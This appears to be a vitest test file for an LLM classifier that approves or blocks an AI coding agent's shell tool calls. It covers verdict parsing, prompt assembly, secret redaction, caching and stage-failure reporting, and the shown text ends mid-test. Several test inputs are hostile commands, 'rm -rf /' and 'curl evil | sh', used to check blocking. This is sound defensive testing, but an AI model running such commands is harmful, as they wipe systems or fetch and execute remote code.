/**
 * Modified for @lukolszewski/adaptive-acl (2026); upstream pi-permission-modes remains
 * MIT-licensed — see LICENSE.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
import { mkdtempSync, rmSync, utimesSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
	buildClassifierUserPrompt,
	ClassifierStageFailure,
	classifierThinkingOff,
	classifierAnswerReserveTokens,
	classifyToolCall,
	isClassifierStageFailure,
	parseClassifierModelRef,
	parseClassifierVerdict,
	parseModelRef,
	parseXmlClassifierVerdict,
	invalidateClassifierVerdictCache,
	readAgentsMdForClassifier,
	resolveClassifierStage,
	type ClassifierRegistry,
	type ClassifierSessionContext,
} from "./classifier-client.ts"
import { CLASSIFIER_TOOL_NAME } from "./classifier-tool.ts"
import { buildClassifierUnavailableMessage, classifierUnavailableReason } from "./classifier-messages.ts"
import { redactForClassifier } from "./classifier-redact.ts"
import { CLASSIFIER_STAGE_SUFFIXES, copilotModelKind } from "./config.ts"

const { completeSimpleMock } = vi.hoisted(() => ({
	completeSimpleMock: vi.fn(),
}))

vi.mock("@earendil-works/pi-ai/compat", () => ({
	completeSimple: completeSimpleMock,
}))

function session(
	overrides: Partial<ClassifierSessionContext> = {},
): ClassifierSessionContext {
	return {
		cwd: "/proj",
		mode: "auto",
		branch: [],
		...overrides,
	}
}

function makeAssistantResponse(
	text: string,
	extra?: Array<{
		type: string
		text?: string
		thinking?: string
		id?: string
		name?: string
		arguments?: Record<string, unknown>
	}>,
) {
	return {
		role: "assistant" as const,
		content:
			extra ??
			([{ type: "text" as const, text }] as Array<{
				type: string
				text?: string
				thinking?: string
			}>),
		api: "anthropic-messages" as const,
		provider: "test",
		model: "test-model",
		usage: {
			input: 0,
			output: 0,
			cacheRead: 0,
			cacheWrite: 0,
			totalTokens: 0,
		},
		stopReason: "stop" as const,
		timestamp: Date.now(),
	}
}

describe("parseModelRef", () => {
	it("parses provider/model", () => {
		expect(parseModelRef("anthropic/claude-haiku-4-5")).toEqual({
			provider: "anthropic",
			modelId: "claude-haiku-4-5",
		})
	})

	it("rejects invalid refs", () => {
		expect(parseModelRef("nope")).toBeNull()
	})

	it("strips the same suffixes config.ts's Copilot ref check strips", () => {
		// Two parsers read one string: this file's, which decides what gets sent, and `copilotModelKind` in
		// config.ts, which decides whether the Auto session header goes with it. If they ever disagree on a
		// suffix, `github-copilot/auto@tool`-shaped refs split — the endpoint is built as an explicit pick and
		// the Auto model answers `model_not_supported` with no session token. config.ts cannot import this
		// module (it is the one config file with no pi dependency), so the lists are compared instead.
		for (const suffix of ["thinking", "high", "medium", "low", "minimal", "xhigh", "off"]) {
			expect(parseModelRef(`github-copilot/auto:${suffix}`)?.modelId).toBe("auto")
			expect(copilotModelKind(`github-copilot/auto:${suffix}`)).toBe("auto")
		}
		for (const stage of CLASSIFIER_STAGE_SUFFIXES) {
			expect(parseClassifierModelRef(`github-copilot/auto@${stage}`)?.modelId).toBe("auto")
			expect(copilotModelKind(`github-copilot/auto@${stage}`)).toBe("auto")
		}
		// A colon that is NOT a known suffix stays part of the id in both, so an id that really contains a
		// colon is never chopped into a different model.
		expect(parseModelRef("github-copilot/gpt-5:9000")?.modelId).toBe("gpt-5:9000")
		expect(copilotModelKind("github-copilot/gpt-5:9000")).toBe("explicit")
	})
})

describe("parseClassifierModelRef", () => {
	it("parses @tool stage suffix on model ref", () => {
		expect(parseClassifierModelRef("CPA/Minimax/MiniMax-M2.7@tool")).toEqual({
			provider: "CPA",
			modelId: "Minimax/MiniMax-M2.7",
			stageOverride: "tool",
		})
	})

	it("parses @both stage suffix", () => {
		expect(parseClassifierModelRef("anthropic/claude-haiku-4-5@both")).toEqual({
			provider: "anthropic",
			modelId: "claude-haiku-4-5",
			stageOverride: "both",
		})
	})
})

describe("resolveClassifierStage", () => {
	it("prefers model ref suffix over config", () => {
		expect(resolveClassifierStage("test/model@single", "tool")).toBe("single")
	})

	it("falls back to config then tool default", () => {
		expect(resolveClassifierStage("test/model", "both")).toBe("both")
		expect(resolveClassifierStage("test/model")).toBe("tool")
	})
})

describe("parseClassifierVerdict", () => {
	it("parses shouldBlock JSON", () => {
		expect(
			parseClassifierVerdict(
				'{"thinking":"ok","shouldBlock":false,"reason":"routine"}',
			),
		).toEqual({ allow: true, reason: "routine", thinking: "ok" })
	})

	it("parses legacy allow JSON", () => {
		expect(parseClassifierVerdict('{"allow":false,"reason":"risky"}')).toEqual({
			allow: false,
			reason: "risky",
		})
	})

	it("parses fenced JSON", () => {
		expect(
			parseClassifierVerdict('```json\n{"shouldBlock":true,"reason":"no"}\n```'),
		).toEqual({ allow: false, reason: "no" })
	})

	it("returns null on bad JSON", () => {
		expect(parseClassifierVerdict("not json")).toBeNull()
	})

	it("parses JSON embedded in prose", () => {
		expect(
			parseClassifierVerdict(
				'Here is my verdict:\n{"shouldBlock":false,"reason":"routine dev command"}',
			),
		).toEqual({ allow: true, reason: "routine dev command" })
	})

	it("parses JSON with trailing comma", () => {
		expect(
			parseClassifierVerdict('{"shouldBlock": true, "reason": "risky",}'),
		).toEqual({ allow: false, reason: "risky" })
	})

	it("parses legacy block field", () => {
		expect(parseClassifierVerdict('{"block":false,"reason":"ok"}')).toEqual({
			allow: true,
			reason: "ok",
		})
	})

	it("parses regex fallback when JSON is slightly malformed", () => {
		expect(
			parseClassifierVerdict('shouldBlock: false, reason: "looks fine"'),
		).toEqual({ allow: true, reason: "looks fine" })
	})
})

function makeRegistry(): ClassifierRegistry {
	return {
		find: () =>
			({
				id: "test-model",
				api: "anthropic-messages",
				baseUrl: "https://api.example.com",
				provider: "test",
			}) as any,
		getApiKeyAndHeaders: async () => ({
			ok: true,
			apiKey: "test-key",
		}),
	}
}

describe("classifyToolCall", () => {
	beforeEach(() => {
		completeSimpleMock.mockReset()
	})

	afterEach(() => {
		vi.restoreAllMocks()
	})

	it("uses the assembled system prompt and a transcript user prompt", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse(
				'{"shouldBlock":false,"reason":"fine","thinking":"ok"}',
			),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session({
				branch: [
					{
						type: "message",
						message: { role: "user", content: "fix the bug" },
					},
				],
			}),
			pendingTool: { name: "bash", input: { command: "npm test" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})

		expect(verdict.allow).toBe(true)
		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
		const [, context, options] = completeSimpleMock.mock.calls[0]!
		expect(context.systemPrompt).toContain("auto-mode safety check for pi")
		expect(context.systemPrompt).toContain("Allow Rules")
		expect(context.messages[0]?.content[0]).toEqual({
			type: "text",
			text: expect.stringContaining("fix the bug"),
		})
		expect(context.messages[0]?.content[0].text).toContain("npm test")
		expect(context.messages[0]?.content[0].text).toContain(
			'Reply with one JSON object only',
		)
		expect(options).toMatchObject({
			apiKey: "test-key",
			maxTokens: 512,
			temperature: 0,
		})
	})

	it("uses classify_result tool in tool stage", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("", [
				{
					type: "toolCall",
					id: "tc1",
					name: CLASSIFIER_TOOL_NAME,
					arguments: {
						thinking: "routine test",
						shouldBlock: false,
						reason: "fine",
					},
				},
			]),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "npm test" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "tool",
		})

		expect(verdict).toEqual({
			allow: true,
			reason: "fine",
			thinking: "routine test",
		})

		const [, context, options] = completeSimpleMock.mock.calls[0]!
		expect(context.tools?.[0]?.name).toBe(CLASSIFIER_TOOL_NAME)
		expect(options).toMatchObject({
			thinkingEnabled: false,
			toolChoice: { type: "tool", name: CLASSIFIER_TOOL_NAME },
			maxTokens: 1024,
		})
		expect(context.messages[0]?.content[0].text).not.toContain(
			"Reply with one JSON object only",
		)
	})

	it("honors @single suffix on model ref over config stage", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":false,"reason":"ok"}'),
		)

		await classifyToolCall({
			modelRef: "test/test-model@single",
			session: session(),
			pendingTool: { name: "bash", input: { command: "ls" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "tool",
		})

		const [, context] = completeSimpleMock.mock.calls[0]!
		expect(context.tools).toBeUndefined()
		expect(context.messages[0]?.content[0].text).toContain(
			"Reply with one JSON object only",
		)
	})

	it("auto-allows when tool has no classifier-relevant input", async () => {
		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "read", input: {} },
			registry: makeRegistry(),
			timeoutMs: 5000,
		})
		expect(verdict.allow).toBe(true)
		expect(completeSimpleMock).not.toHaveBeenCalled()
	})

	it("returns deny verdict from classifier output", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":true,"reason":"no"}'),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})
		expect(verdict.allow).toBe(false)
	})

	it("parses verdict from thinking block when text is empty", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("", [
				{
					type: "thinking",
					thinking:
						'{"shouldBlock":false,"reason":"routine","thinking":"brief"}',
				},
			]),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "npm test" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})
		expect(verdict.allow).toBe(true)
	})

	it("throws when classifier returns unparseable JSON", async () => {
		completeSimpleMock.mockResolvedValue(makeAssistantResponse("not json"))

		await expect(
			classifyToolCall({
				modelRef: "test/test-model",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry: makeRegistry(),
				timeoutMs: 1000,
				stage: "single",
			}),
		).rejects.toThrow(/unparseable (JSON|tool result|XML\/JSON)/)
	})

	it("throws when tool stage returns no classify_result call", async () => {
		completeSimpleMock.mockResolvedValue(makeAssistantResponse("not a tool"))

		await expect(
			classifyToolCall({
				modelRef: "test/test-model",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry: makeRegistry(),
				timeoutMs: 1000,
				stage: "tool",
			}),
		).rejects.toThrow(/unparseable tool result/)
	})

	it("reports timeout when the deadline is exceeded", async () => {
		completeSimpleMock.mockImplementation(
			async (_model, _context, options) => {
				await new Promise<void>((resolve) => {
					options?.signal?.addEventListener("abort", () => resolve(), {
						once: true,
					})
				})
				return {
					...makeAssistantResponse(""),
					stopReason: "aborted" as const,
				}
			},
		)

		await expect(
			classifyToolCall({
				modelRef: "test/test-model",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry: makeRegistry(),
				timeoutMs: 20,
				stage: "single",
			}),
		).rejects.toThrow(/timed out after 20ms/)
	})

	it("throws when model is not found", async () => {
		const registry: ClassifierRegistry = {
			find: () => undefined,
			getApiKeyAndHeaders: async () => ({ ok: true }),
		}

		await expect(
			classifyToolCall({
				modelRef: "test/missing",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry,
				timeoutMs: 1000,
			}),
		).rejects.toThrow(/not found/)
	})
})

describe("buildClassifierUserPrompt", () => {
	it("includes transcript and excludes assistant text", () => {
		const prompt = buildClassifierUserPrompt({
			session: session({
				reviewHint: "bash not on read-only allowlist",
				branch: [
					{
						type: "message",
						message: { role: "user", content: "hello" },
					},
					{
						type: "message",
						message: {
							role: "assistant",
							content: [
								{ type: "text", text: "I will run tests" },
								{
									type: "toolCall",
									id: "1",
									name: "bash",
									arguments: { command: "npm test" },
								},
							],
						},
					},
				],
			}),
			pendingTool: { name: "bash", input: { command: "npm install" } },
		})
		expect(prompt).toContain("mode: auto")
		expect(prompt).toContain("/proj")
		expect(prompt).toContain("User: hello")
		expect(prompt).toContain("bash npm test")
		expect(prompt).not.toContain("I will run tests")
		expect(prompt).toContain("npm install")
	})

	it("redacts secrets in transcript", () => {
		const prompt = buildClassifierUserPrompt({
			session: session({
				branch: [
					{
						type: "message",
						message: {
							role: "user",
							content: "token sk-abcdefghijklmnopqrstuvwxyz",
						},
					},
				],
			}),
			pendingTool: { name: "bash", input: { command: "echo" } },
		})
		expect(prompt).not.toContain("sk-abcdefghijklmnopqrstuvwxyz")
		expect(prompt).toContain("sk-[REDACTED]")
	})
})

describe("redactForClassifier", () => {
	it("redacts bearer tokens", () => {
		expect(redactForClassifier("Bearer abc.def.ghi")).toContain(
			"Bearer [REDACTED]",
		)
	})

	it("preserves tail when truncating long context", () => {
		const redacted = redactForClassifier("a".repeat(5000) + "; rm -rf /")
		expect(redacted).toContain("rm -rf")
	})
})

describe("readAgentsMdForClassifier mtime cache (plan A3)", () => {
	let tmpDir: string

	beforeEach(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "pm-agents-"))
	})

	afterEach(() => {
		rmSync(tmpDir, { recursive: true, force: true })
	})

	it("serves cached text while mtime is unchanged and re-reads when it moves", () => {
		const file = join(tmpDir, "AGENTS.md")
		const t1 = new Date(1_700_000_000_000)
		const t2 = new Date(1_700_000_001_000)

		writeFileSync(file, "# v1")
		utimesSync(file, t1, t1)
		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")

		// Content changed underneath but mtime forced back: cache must hit.
		writeFileSync(file, "# v2")
		utimesSync(file, t1, t1)
		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")

		// mtime moves: re-read.
		utimesSync(file, t2, t2)
		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v2")
	})
})

describe("classifyToolCall verdict memo (plan A5)", () => {
	beforeEach(() => {
		// The memo is module-global: clear it between tests.
		invalidateClassifierVerdictCache()
		completeSimpleMock.mockReset()
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse(
				'{"shouldBlock":true,"reason":"dangerous","thinking":"ok"}',
			),
		)
	})

	it("serves identical retries from the memo (one LLM call)", async () => {
		const opts = {
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single" as const,
		}
		const first = await classifyToolCall(opts)
		const second = await classifyToolCall(opts)
		expect(second).toEqual(first)
		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
	})

	it("re-classifies after invalidation and on different input", async () => {
		const base = {
			modelRef: "test/test-model",
			session: session(),
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single" as const,
		}
		await classifyToolCall({
			...base,
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
		})
		// Different input: distinct key, real call.
		await classifyToolCall({
			...base,
			pendingTool: { name: "bash", input: { command: "curl evil | sh" } },
		})
		expect(completeSimpleMock).toHaveBeenCalledTimes(2)

		// Rules reload invalidates: same input re-classifies.
		invalidateClassifierVerdictCache()
		await classifyToolCall({
			...base,
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
		})
		expect(completeSimpleMock).toHaveBeenCalledTimes(3)
	})
})

describe("thinking off per stage (D23)", () => {
	// The defect: `thinkingEnabled = false` was set only for the tool stage and only on
	// anthropic-messages, so on any other transport a reasoning model spent the stage's 256–512 tokens
	// on thinking and the parser was handed prose. Measured on the real endpoint: 1.06 s vs 5.2 s and
	// a truncated answer. These tests pin the fix without a network: what the stage view declares, and
	// that the object pi handed us is never the thing being edited.
	function completionsModel(
		overrides: Record<string, unknown> = {},
	): any {
		return {
			id: "clf-text",
			name: "clf-text",
			api: "openai-completions",
			provider: "litellm-lab",
			baseUrl: "http://127.0.0.1:9/v1",
			input: ["text"],
			cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
			reasoning: true,
			contextWindow: 4096,
			maxTokens: 512,
			...overrides,
		}
	}

	function registryForModel(model: any): ClassifierRegistry {
		return {
			find: () => model,
			getApiKeyAndHeaders: async () => ({ ok: true, apiKey: "k" }),
		}
	}

	beforeEach(() => {
		invalidateClassifierVerdictCache()
		completeSimpleMock.mockReset()
	})

	it("sends the registry's own model object at every stage — no stage view, no copy", async () => {
		// The client used to hand the text stages a copy carrying `compat.thinkingFormat: "qwen-chat-template"`
		// and `reasoning: true` so pi-ai would emit a chat-template field. That field is one server's dialect,
		// not every server's, and the copy is gone (`classifier-thinking-knob.test.ts`). What the registry
		// gave us is what the adapter gets, deliberately: the object is shared with the whole session, so a
		// copy is the only safe place for a knob — and there is no knob left to place.
		const model = completionsModel()
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":false,"reason":"routine"}'),
		)

		await classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: "tokei --stats src" } },
			registry: registryForModel(model),
			timeoutMs: 5000,
			stage: "single",
		})

		const [sentModel, , options] = completeSimpleMock.mock.calls[0]!
		expect(sentModel).toBe(model)
		expect(options).not.toHaveProperty("reasoning")
		expect(options).not.toHaveProperty("onPayload")
		expect(model.compat).toBeUndefined()
		expect(model.reasoning).toBe(true) // untouched: the registry's declaration, not ours
	})

	it("injects no chat_template_kwargs and no thinking format for any stage", async () => {
		// The default request is what pi-ai built. Nothing about it is the classifier's opinion of the server.
		for (const stage of ["tool", "single", "fast", "both", "thinking"] as const) {
			invalidateClassifierVerdictCache()
			completeSimpleMock.mockReset()
			const model = completionsModel({ reasoning: false })
			completeSimpleMock.mockResolvedValue(
				stage === "tool"
					? makeAssistantResponse("", [
							{
								type: "toolCall",
								id: "t1",
								name: CLASSIFIER_TOOL_NAME,
								arguments: { shouldBlock: false, reason: "fine" },
							},
						])
					: stage === "single"
						? makeAssistantResponse('{"shouldBlock":false,"reason":"fine"}')
						: makeAssistantResponse("<block>no</block>"),
			)

			await classifyToolCall({
				modelRef: "litellm-lab/clf-text",
				session: session(),
				pendingTool: { name: "bash", input: { command: `ls -la # ${stage}` } },
				registry: registryForModel(model),
				timeoutMs: 5000,
				stage,
			})

			const [sentModel, , options] = completeSimpleMock.mock.calls[0]!
			expect(sentModel).toBe(model)
			expect((sentModel.compat as { thinkingFormat?: string } | undefined)?.thinkingFormat).toBeUndefined()
			expect(options).not.toHaveProperty("reasoning")
			expect(options).not.toHaveProperty("chat_template_kwargs")
			expect(options).not.toHaveProperty("onPayload")
		}
	})

	it("leaves a thinking format the user already declared alone", () => {
		const model = completionsModel({
			compat: { thinkingFormat: "deepseek", maxTokensField: "max_tokens" },
		})
		// Nothing here reads or rewrites it: the user's declaration reaches pi-ai exactly as they wrote it.
		expect(classifierThinkingOff(model)).toEqual({ via: "unknown" })
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":false,"reason":"routine"}'),
		)
		return classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: "tokei src" } },
			registry: registryForModel(model),
			timeoutMs: 5000,
			stage: "single",
		}).then(() => {
			expect(completeSimpleMock.mock.calls[0]![0]).toBe(model)
			expect(model.compat).toMatchObject({ thinkingFormat: "deepseek" })
		})
	})

	it("switches thinking off on anthropic at the text stages, not only at the tool stage", async () => {
		// The one-line shape of the bug: this assertion, run against the old client, fails.
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":true,"reason":"no"}'),
		)

		await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "pnpm build" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})

		const [, , options] = completeSimpleMock.mock.calls[0]!
		expect(options).toMatchObject({ thinkingEnabled: false })
		expect(options).not.toHaveProperty("toolChoice")
	})

	it("keeps forcing the tool call at the tool stage on every transport", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("", [
				{
					type: "toolCall",
					id: "t1",
					name: CLASSIFIER_TOOL_NAME,
					arguments: { shouldBlock: false, reason: "fine" },
				},
			]),
		)

		await classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: "ls -la" } },
			registry: registryForModel(completionsModel()),
			timeoutMs: 5000,
			stage: "tool",
		})

		const [, , options] = completeSimpleMock.mock.calls[0]!
		expect(options.toolChoice).toEqual({
			type: "function",
			function: { name: CLASSIFIER_TOOL_NAME },
		})
	})
})

describe("classifier.extraRequestFields through onPayload", () => {
	// The field a server needs to stop thinking (or to be tagged, seeded, or asked for a particular effort) is
	// the user's config, not a guess made here. pi-ai hands the built payload to `onPayload` and uses the
	// return value as the payload when it is not undefined, so the merge is one hook and no dialect knowledge.
	function completionsModel(): any {
		return {
			id: "clf-text",
			name: "clf-text",
			api: "openai-completions",
			provider: "litellm-lab",
			baseUrl: "http://127.0.0.1:9/v1",
			input: ["text"],
			cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
			reasoning: false,
			contextWindow: 4096,
			maxTokens: 512,
		}
	}

	function registryForModel(model: any): ClassifierRegistry {
		return {
			find: () => model,
			getApiKeyAndHeaders: async () => ({ ok: true, apiKey: "k" }),
		}
	}

	const payload = {
		model: "clf-text",
		messages: [{ role: "user", content: "hi" }],
		temperature: 0,
		max_tokens: 512,
	}

	beforeEach(() => {
		invalidateClassifierVerdictCache()
		completeSimpleMock.mockReset()
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":false,"reason":"fine"}'),
		)
	})

	/** The options the client passed to completeSimple on its one call, with the hook already applied. */
	async function sentPayload(
		fields: Record<string, unknown> | undefined,
	): Promise<{ options: any; payload: any }> {
		await classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: `ls ${JSON.stringify(fields)}` } },
			registry: registryForModel(completionsModel()),
			timeoutMs: 5000,
			stage: "single",
			extraRequestFields: fields,
		})
		const [, , options] = completeSimpleMock.mock.calls[0]!
		const sent = options.onPayload
			? await options.onPayload(structuredClone(payload))
			: structuredClone(payload)
		return { options, payload: sent }
	}

	it("installs no hook at all by default — the request is exactly what pi-ai built", async () => {
		const { options, payload: sent } = await sentPayload(undefined)
		expect(options).not.toHaveProperty("onPayload")
		expect(sent).toEqual(payload)
		const { options: empty, payload: withEmpty } = await sentPayload({})
		expect(empty).not.toHaveProperty("onPayload")
		expect(withEmpty).toEqual(payload)
	})

	it("merges the user's fields into the payload, key by key", async () => {
		const { options, payload: sent } = await sentPayload({
			chat_template_kwargs: { enable_thinking: false },
			seed: 42,
		})
		expect(typeof options.onPayload).toBe("function")
		expect(sent).toEqual({
			...payload,
			chat_template_kwargs: { enable_thinking: false },
			seed: 42,
		})
		// The input body is never mutated: pi-ai keeps the original for its own bookkeeping.
		expect(payload).toEqual({
			model: "clf-text",
			messages: [{ role: "user", content: "hi" }],
			temperature: 0,
			max_tokens: 512,
		})
	})

	it("removes a key the client set when the value is null", async () => {
		const { payload: sent } = await sentPayload({ temperature: null })
		expect(sent).not.toHaveProperty("temperature")
		expect(sent).toMatchObject({ model: "clf-text", max_tokens: 512 })
	})

	it("never lets a field replace the model, the prompt, the schema or the answer limit", async () => {
		// Config loading reports these as an error; the merge refuses them again, because the verdict depends
		// on the schema and the limit has its own setting.
		const { payload: sent } = await sentPayload({
			model: "someone-else",
			messages: [],
			max_tokens: 9,
			response_format: { type: "text" },
			temperature: null,
		})
		expect(sent).toEqual({
			model: "clf-text",
			messages: payload.messages,
			max_tokens: 512,
		})
	})

	it("applies the same merge at the tool stage and reads the verdict normally", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("", [
				{
					type: "toolCall",
					id: "t1",
					name: CLASSIFIER_TOOL_NAME,
					arguments: { shouldBlock: false, reason: "fine" },
				},
			]),
		)
		await classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: "ls" } },
			registry: registryForModel(completionsModel()),
			timeoutMs: 5000,
			stage: "tool",
			extraRequestFields: { seed: 7 },
		})
		const [, , options] = completeSimpleMock.mock.calls[0]!
		expect(await options.onPayload(structuredClone(payload))).toMatchObject({ seed: 7 })
	})
})

describe("classifier.maxOutputTokens is a floor on every stage's answer limit", () => {
	function completionsModel(): any {
		return {
			id: "clf-text",
			name: "clf-text",
			api: "openai-completions",
			provider: "litellm-lab",
			baseUrl: "http://127.0.0.1:9/v1",
			input: ["text"],
			cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
			reasoning: false,
			contextWindow: 4096,
			maxTokens: 512,
		}
	}

	function registryForModel(model: any): ClassifierRegistry {
		return {
			find: () => model,
			getApiKeyAndHeaders: async () => ({ ok: true, apiKey: "k" }),
		}
	}

	beforeEach(() => {
		invalidateClassifierVerdictCache()
		completeSimpleMock.mockReset()
	})

	it("defaults to the stage's own numbers when nothing is configured", () => {
		expect(classifierAnswerReserveTokens("tool")).toBe(1024)
		expect(classifierAnswerReserveTokens("single")).toBe(512)
		expect(classifierAnswerReserveTokens("fast")).toBe(256)
		expect(classifierAnswerReserveTokens(undefined, 0)).toBe(512)
	})

	it("raises a stage that asks for less, and never lowers one that asks for more", () => {
		expect(classifierAnswerReserveTokens("fast", 4000)).toBe(4000)
		expect(classifierAnswerReserveTokens("tool", 4000)).toBe(4000)
		expect(classifierAnswerReserveTokens("tool", 120)).toBe(1024)
		expect(classifierAnswerReserveTokens("single", 100)).toBe(512)
		// Nonsense contributes nothing rather than shrinking the answer; config loading reports it.
		expect(classifierAnswerReserveTokens("single", Number.NaN)).toBe(512)
		expect(classifierAnswerReserveTokens("single", -5)).toBe(512)
	})

	it("sends the raised limit to the provider and reports it in a stage failure", async () => {
		completeSimpleMock.mockResolvedValue({
			...makeAssistantResponse("Let me think about this command. First,"),
			stopReason: "length",
		})
		const err = await classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: "ls" } },
			registry: registryForModel(completionsModel()),
			timeoutMs: 5000,
			stage: "single",
			maxOutputTokens: 3000,
		}).then(
			() => {
				throw new Error("expected the stage to fail")
			},
			(e: unknown) => e,
		)

		const [, , options] = completeSimpleMock.mock.calls[0]!
		expect(options).toMatchObject({ maxTokens: 3000 })
		expect((err as ClassifierStageFailure).maxTokens).toBe(3000)
		expect((err as ClassifierStageFailure).message).toContain("max_tokens=3000")
	})

	it("raises the XML recall pass too, not only the review pass", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("<block>no</block>"),
		)
		await classifyToolCall({
			modelRef: "litellm-lab/clf-text",
			session: session(),
			pendingTool: { name: "bash", input: { command: "ls" } },
			registry: registryForModel(completionsModel()),
			timeoutMs: 5000,
			stage: "both",
			maxOutputTokens: 2048,
		})
		// Stage 1 is the 64-token pass; it is the one a reasoning model starves on a block path.
		expect(completeSimpleMock.mock.calls[0]![2]).toMatchObject({ maxTokens: 2048 })
	})

	it("reserves the same room in the transcript budget it will ask the provider for", () => {
		// Same window, same transcript: the configured limit is what the budget subtracts, so a call that asks
		// for 3 000 answer tokens must not also hand the model a 12 000-character history.
		const branch = Array.from({ length: 40 }, (_, i) => ({
			type: "message",
			message: { role: "user", content: `message number ${i} ${"x".repeat(400)}` },
		}))
		const opts = {
			session: session({ branch }),
			pendingTool: { name: "bash", input: { command: "ls" } },
			stage: "single" as const,
			contextTokens: 4096,
			systemPrompt: "system",
		}
		const unbounded = buildClassifierUserPrompt({
			...opts,
			maxOutputTokens: 200,
		})
		const bounded = buildClassifierUserPrompt({
			...opts,
			maxOutputTokens: 3000,
		})
		expect(bounded.length).toBeLessThan(unbounded.length)
	})
})

describe("a stage that got prose says so (D23)", () => {
	// "Silent is the bug; wrong is allowed." A truncated reasoning answer must not reach a user as a deny
	// that reads like a considered refusal, so each shape of non-answer has a name, carries the numbers
	// that explain it, and is attributed as `unavailable` rather than as a decision.
	function reply(content: Array<Record<string, unknown>>, stopReason = "stop") {
		return {
			...makeAssistantResponse("", content as never),
			stopReason: stopReason as never,
		}
	}

	function textReply(text: string, stopReason = "stop") {
		return reply([{ type: "text", text }], stopReason)
	}

	function rejectWith(opts: Parameters<typeof classifyToolCall>[0]) {
		return classifyToolCall(opts).then(
			() => {
				throw new Error("the stage produced a verdict; expected it to fail")
			},
			(err: unknown) => err,
		)
	}

	const pending = { name: "bash", input: { command: "ls" } }
	const base = {
		modelRef: "test/test-model",
		session: session(),
		pendingTool: pending,
		registry: makeRegistry(),
		timeoutMs: 1000,
	}

	beforeEach(() => {
		invalidateClassifierVerdictCache()
		completeSimpleMock.mockReset()
	})

	it("names a truncated answer for the stage that was too small for it", async () => {
		completeSimpleMock.mockResolvedValue(
			textReply("Let me think about this command. First,", "length"),
		)
		const err = await rejectWith({ ...base, stage: "single" })

		expect(isClassifierStageFailure(err)).toBe(true)
		expect(err).toBeInstanceOf(ClassifierStageFailure)
		const failure = err as ClassifierStageFailure
		expect(failure.kind).toBe("truncated")
		expect(failure.stage).toBe("single")
		expect(failure.maxTokens).toBe(512)
		expect(failure.stopReason).toBe("length")
		expect(failure.message).toContain("classifier stage single")
		expect(failure.message).toContain("token cap")
		expect(failure.message).toContain("max_tokens=512")
		// The text that arrived is quoted, so the next reader does not have to re-run the call.
		expect(failure.message).toContain("Let me think about this command")
	})

	it("names prose, and still refuses to read a verdict out of it", async () => {
		completeSimpleMock.mockResolvedValue(
			textReply("I am not sure about this one, it looks a bit risky to me."),
		)
		const err = await rejectWith({ ...base, stage: "single", pendingTool: { name: "bash", input: { command: "uptime" } } })

		expect((err as ClassifierStageFailure).kind).toBe("prose")
		// Not tolerant, in either direction: no allow was invented from the model's chatter.
		expect(isClassifierStageFailure(err)).toBe(true)
